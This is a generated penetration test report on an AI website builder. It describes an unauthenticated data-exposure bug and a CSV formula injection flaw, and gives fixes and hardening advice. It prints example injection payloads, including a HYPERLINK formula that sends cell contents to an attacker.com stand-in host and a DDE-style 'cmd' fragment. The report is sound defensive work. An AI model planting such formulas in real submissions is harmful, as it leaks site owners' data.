# Security Penetration Test Report

**Generated:** 2026-08-10 20:05:24 UTC

# Executive Summary

# Executive Summary

An authorized white-box security assessment of the **Cluster Web Builder** (Next.js 16 AI website builder with Prisma/Neon PostgreSQL, Stripe, OpenRouter, Pexels, Vercel Blob, Brevo) identified **two confirmed medium-severity vulnerabilities** and several defense-in-depth hardening opportunities.

**Overall Risk Posture:** **Moderate** — The application demonstrates solid architectural security practices (centralized authorization, robust session handling, prepared statements via Prisma, output escaping in render pipelines) but has two exploitable data-exposure and injection issues.

## Key Findings

| ID | Title | Severity | CVSS | Impact |
|----|-------|----------|------|--------|
| **vuln-0001** | Unauthenticated disclosure of unpublished sites in GET `/api/map-sites` | **Medium** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Exposure of private `DRAFT`/`GENERATED` sites' business names, locations, internal IDs, and creation timestamps |
| **vuln-0002** | CSV Formula Injection in exported leads spreadsheet | **Medium** | 4.7 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N) | Malicious lead submissions inject spreadsheet formulas (=, +, -, @) that execute when site owners open the CSV export in Excel/Calc |

## Business Impact

- **vuln-0001**: Competitors or attackers can enumerate unpublished business projects, revealing business names, types, and physical locations before public launch — a privacy and competitive-intelligence risk.
- **vuln-0002**: Site owners who download lead exports and open them in spreadsheet software risk data exfiltration (via `=HYPERLINK(...)`) or DDE-style payload execution — a client-side integrity risk.

## Remediation Themes

1. **Add publish-status filter** to `/api/map-sites` (trivial fix: one-line `where` clause addition).
2. **Neutralize spreadsheet formula triggers** in the CSV export `csvCell` helper (low effort: prefix leading `=`, `+`, `-`, `@` with a neutral apostrophe).
3. **Defense-in-depth hardening**: tighten login rate-limiting (remove spoofable `X-Forwarded-For` from key), raise scrypt cost factor, add CSRF tokens/Origin validation on state-changing routes, and consider a Content-Security-Policy header.

# Methodology

# Methodology

This assessment followed a **white-box, source-aware methodology** aligned with **OWASP WSTG v4.2** and **OWASP ASVS 4.0 Level 2** control objectives, adapted for a Next.js 16 / React 19 / Prisma codebase.

**Engagement Type:** White-box (full source code access at `/workspace/strix-target-20260810-130438`).

**Scope:** All application code under `app/`, `components/`, `lib/`, `prisma/`, including API routes, server components, authentication/session logic, database schema, and third-party integrations (Stripe, OpenRouter, Pexels, Vercel Blob, Brevo).

**Activities Performed:**

1. **Static Analysis & Triage**
   - Manual code review of authentication (`lib/auth.ts`, `lib/password.ts`), authorization (`lib/site/access.ts`, `lib/site/site-access-where.ts`), and all 25+ API route handlers.
   - Secret scanning intent via `gitleaks`/`trufflehog` (delegated to subagent; no committed secrets found).
   - Dependency vulnerability scanning intent via `trivy fs` / `npm audit` (delegated; subagent execution interrupted).
   - AST-structural mapping via `semgrep`/`ast-grep` (delegated; subagent execution interrupted).

2. **Dynamic Validation (Source-Guided)**
   - Vulnerability hypotheses derived from code review were validated by specialized subagents against the actual source logic.
   - `Map-Sites-Exploit-Agent` confirmed unauthenticated data exposure in `/api/map-sites` via unambiguous static analysis (Prisma query lacks `status: "PUBLISHED"` filter and route has no auth gate).
   - `CSV-Injection-Agent` reproduced the formula injection by executing the exact `csvCell` logic with malicious payloads (`=HYPERLINK(...)`, `@SUM(...)`, `-1+2`, `=cmd|...`) — all survived un-neutralized into CSV output.
   - `Authorization-Audit-Agent` performed route-by-route IDOR/BFLA audit; found consistent ownership enforcement via `assertSiteAccess` / inline `userId` patterns; no additional IDOR confirmed.
   - `Auth-CSRF-BusinessLogic-Agent` audited auth, session, CSRF, and business logic; no exploitable privilege escalation, auth bypass, or webhook flaw found; documented hardening gaps.
   - `XSS-Render-Posture-Agent` (and redo) reviewed `v2-render.ts`, `export-html.ts`, `SitePreviewV2.tsx`, and legacy paths; confirmed `escapeHtml`/`safeUrl`/`sanitizeLink` coverage is complete for V2; no confirmed XSS sink.

3. **Reporting**
   - Two confirmed vulnerabilities filed via `create_vulnerability_report` with inline code patches (`fix_before`/`fix_after`).
   - All findings documented in notes for final report assembly.

# Technical Analysis

# Technical Analysis

## Severity Model
CVSS v3.1 scores reflect **demonstrated exploitability × impact** from the PoC-validated findings. Scores are not inflated by theoretical chaining or scanner labels.

### vuln-0001: Unauthenticated Disclosure of Unpublished Sites (`/api/map-sites`)
- **Root Cause**: `app/api/map-sites/route.ts` queries `prisma.site.findMany({ where: { location: { not: null } } })` without a `status: "PUBLISHED"` filter and without any authentication/authorization check. Only per-IP rate limiting is applied.
- **Exploitability**: **Network (AV:N)**, **Low Complexity (AC:L)**, **No Privileges (PR:N)**, **No User Interaction (UI:N)** — any anonymous caller can `GET /api/map-sites` and receive up to 60 sites' `id`, `businessName`, `location`, `createdAt`.
- **Impact**: **Confidentiality Low (C:L)** — exposes private business metadata (names, physical locations) of `DRAFT` and `GENERATED` (unpublished) projects. No integrity or availability impact.
- **Scope**: Unchanged (S:U) — same component.
- **Fix**: Add `status: "PUBLISHED"` to the Prisma `where` clause (trivial, one line).

### vuln-0002: CSV Formula Injection in Leads Export
- **Root Cause**: `app/api/sites/[siteId]/leads/export/route.ts` uses `csvCell(value) => \`"${value.replace(/"/g, '""')}"\`` which only escapes embedded quotes. It does **not** neutralize cells starting with `=`, `+`, `-`, or `@`. The public leads endpoint (`POST /api/public/sites/[slug]/leads`) accepts these characters in `name`, `email`, `phone`, `message` without sanitization.
- **Exploitability**: **Network (AV:N)**, **Low Complexity (AC:L)**, **No Privileges (PR:N)**, **User Interaction Required (UI:R)** — victim (site owner) must open the exported CSV in a spreadsheet application.
- **Impact**: **Confidentiality Low (C:L)** — formula can exfiltrate cell contents via `=HYPERLINK("http://attacker.com/?leak="&A1)`. **Integrity Low (I:L)** — DDE/CSV formula execution can modify spreadsheet behavior. No availability impact.
- **Scope**: Unchanged (S:U).
- **Fix**: Prefix formula-triggering cells with a neutral apostrophe (`'`) in `csvCell` (low effort, one function change).

## Systemic Strengths (No Findings)
- **Authorization**: Centralized `assertSiteAccess` + `siteAccessWhere` used consistently across site-scoped routes; admin bypass correctly scoped; guest ownership sealed to token holder; section/revision sub-resources scoped to parent `siteId`.
- **Authentication/Session**: 32-byte random tokens, SHA-256 hashed, httpOnly + Secure + SameSite=lax cookies; password reset uses 30-min single-use hashed tokens; scrypt KDF (though cost factor could be raised).
- **Input Validation**: Zod schemas on all public endpoints; `sanitizeLink` restricts CTA links to safe schemes (`https:`, `/`, `#`, `mailto:`, `tel:`); file upload via Vercel Blob with path/extension/size validation.
- **Rendering/XSS**: V2 render pipeline (`lib/site/v2-render.ts`) applies `escapeHtml` to all text interpolations and `safeUrl`/`sanitizeLink` to all URLs; LD+JSON uses `JSON.stringify(...).replace(/</g, "\\u003c")`; no raw unescaped `dangerouslySetInnerHTML` sinks confirmed.
- **Business Logic**: Register hard-defaults to `EDITOR`; admin creation requires existing `ADMIN`; Stripe webhook validates signature; `client_reference_id` binds checkout to session user; Pro entitlements checked on publish/download/domain/media.

## Hardening Gaps (Not Vulnerabilities)
| Area | Gap | Recommendation |
|------|-----|----------------|
| Login Rate Limit | Key = spoofable `X-Forwarded-For` + username; rotating usernames/IP defeats per-account throttle | Key by trusted proxy header + username; consider per-account lockout |
| Password Hashing | scrypt default `N=16384` below OWASP `N=131072` (2^17) | Raise cost factor in `lib/password.ts` |
| CSRF Defense | Relies solely on SameSite=lax; no CSRF tokens or Origin/Referer validation | Add CSRF tokens or explicit Origin validation on state-changing routes |
| Security Headers | No Content-Security-Policy header | Add CSP in `next.config.mjs` (defense-in-depth for XSS) |

# Recommendations

# Recommendations

## Immediate (Address Confirmed Vulnerabilities)

1. **Fix `/api/map-sites` data exposure** — Add `status: "PUBLISHED"` to the Prisma query `where` clause in `app/api/map-sites/route.ts:147-156`. (Trivial effort; fix already provided in vuln-0001 report.)

2. **Fix CSV formula injection** — Modify `csvCell` in `app/api/sites/[siteId]/leads/export/route.ts:17` to prefix cells starting with `=`, `+`, `-`, `@` with a neutral apostrophe (`'`). (Low effort; fix already provided in vuln-0002 report.)

3. **Retest both fixes** — Confirm `/api/map-sites` returns only published sites and CSV export neutralizes formula triggers while preserving display fidelity.

## Short-term (Defense-in-Depth Hardening)

4. **Harden login rate limiting** — Derive client IP from a trusted proxy header (e.g., `x-real-ip` behind a known load balancer) rather than trusting `x-forwarded-for`; enforce per-account throttle independent of IP.

5. **Raise scrypt cost factor** — Update `lib/password.ts` to use `N=131072` (2^17) per current OWASP recommendation; re-hash on next successful login.

6. **Add CSRF tokens or Origin validation** — Implement double-submit CSRF tokens or explicit `Origin`/`Referer` header checks on all state-changing API routes (`POST`, `PUT`, `PATCH`, `DELETE`) as defense-in-depth beyond SameSite=lax.

7. **Add Content-Security-Policy header** — Extend `next.config.mjs` `headers()` to include a CSP (e.g., `script-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; connect-src 'self' https://api.pexels.com https://api.vercel.com https://openrouter.ai; frame-ancestors 'none'`).

8. **Review legacy V1 render path** — Ensure `components/builder/SitePreview.tsx` and `lib/site/export-html.ts` / `section-composer.ts` apply equivalent escaping to any free-form text interpolated into HTML.

## Medium-term (Operational)

9. **Run automated dependency scanning in CI** — Integrate `trivy fs --scanners vuln` or `npm audit` into the build pipeline to catch known-CVE dependencies early.

10. **Secret scanning in CI** — Add `gitleaks` or `trufflehog` to pre-commit / CI to prevent accidental credential commits.

## Retest & Validation Guidance

- Re-run the two PoC validations after fixes:
  - `GET /api/map-sites` → should return only sites with `status === "PUBLISHED"` (or empty array if none).
  - Submit a lead with `message: "=HYPERLINK(\"http://evil\",\"click\")"`, export CSV → open in Excel/Calc → cell should display literal `=HYPERLINK(...)` not evaluate as formula.
- Verify no regression in publish/download/lead-export flows for legitimate users.

